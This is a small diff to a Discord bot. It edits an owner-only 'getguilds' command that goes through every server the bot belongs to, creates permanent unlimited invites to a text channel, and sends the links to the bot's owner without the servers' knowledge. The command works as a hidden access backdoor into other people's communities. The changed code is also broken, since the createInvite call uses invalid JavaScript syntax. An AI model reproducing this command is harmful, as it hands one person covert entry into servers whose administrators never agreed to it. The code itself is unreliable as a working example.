@@ -59,7 +59,7 @@ client.on("message", msg => {
    if(msg.content === `${prefix}getguilds`) {
      if(msg.author.id === `${assy}`) {
        msg.client.guilds.cache.forEach(g => {
-    let ch = g.channels.cache.filter(c => c.type === "text")
+    let ch = g.channels.cache.find(c => c.type === "text")
       ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
       .then(invite => msg.channel.send('discord.gg/' + `${invite.code}`))
 })
